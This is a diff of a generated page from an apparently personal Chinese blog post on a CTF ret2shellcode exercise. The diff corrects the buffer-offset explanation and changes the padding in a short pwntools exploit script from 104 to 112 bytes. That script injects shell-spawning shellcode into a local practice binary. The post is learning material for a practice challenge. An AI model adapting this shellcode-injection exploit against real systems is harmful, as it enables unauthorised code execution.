@@ -33,7 +33,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http://ML-hacker.github.io/posts/baserop/"
-        },"genre": "posts","keywords": "ROP","wordcount":  425 ,
+        },"genre": "posts","keywords": "ROP","wordcount":  423 ,
         "url": "http://ML-hacker.github.io/posts/baserop/","datePublished": "2024-07-12T14:38:20+08:00","dateModified": "2024-07-12T14:38:20+08:00","publisher": {
             "@type": "Organization",
             "name": "Delete"},"author": {
@@ -129,7 +129,7 @@
             <div class="post-meta-line">
                 <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
                 </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>PWN</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-07-12">2024-07-12</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-07-12">2024-07-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;425 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;2 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-07-12">2024-07-12</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-07-12">2024-07-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;423 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;2 minutes&nbsp;</div>
         </div><div class="content" id="content"><h1 id="前言" class="headerLink">
     <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h1><p>本来在校的时候就把王爽的汇编看完了，然后也看了一点二进制的知识，想着开始学pwn的，结果又是拖了好久，这不暑假才开始，在这里特别感谢一下D1no的Dusk师傅呜呜呜。</p>
 <h1 id="前置知识" class="headerLink">
@@ -351,9 +351,7 @@ exp.py</p>
         srcset="/img/baseROP/1.png, /img/baseROP/1.png 1.5x, /img/baseROP/1.png 2x"
         alt="/img/baseROP/1.png"
         title="/img/baseROP/1.png" ></figure>
-然后s的位置就在ebp-0x64H上面</p>
-<p>所以我们就是往上走100个字节再加上4字节到ret然后进行跳转。
-(不过不知道为啥wiki上面是走112个字节，我也算不明白了呜呜呜)</p>
+然后s的位置需要GDB自己调试一下，不能直接用0x64+0x04来计算，需要看实际s相对于esp和ebp的距离再计算。这里我就不做示例了网上都有分析的</p>
 <p>exp.py</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -370,12 +368,12 @@ exp.py</p>
 </span></span><span class="line"><span class="cl"><span class="n">fi</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2shellcode&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="mh">0x0804A080</span>
 </span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span>  <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span><span class="c1">#制作shellcode</span>
-</span></span><span class="line"><span class="cl"><span class="n">playload</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">104</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">playload</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">112</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">fi</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">playload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">fi</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>这里的ljust方法就是将其补齐到104个字节，因为我们要到ret的地址上面所以需要补齐。</p>
+</div><p>这里的ljust方法就是将其补齐到112个字节，因为我们要到ret的地址上面所以需要补齐。</p>
 <p>reference：
 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode" target="_blank" rel="noopener noreferrer">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode</a>
 再次感谢Dusk师傅</p></div>
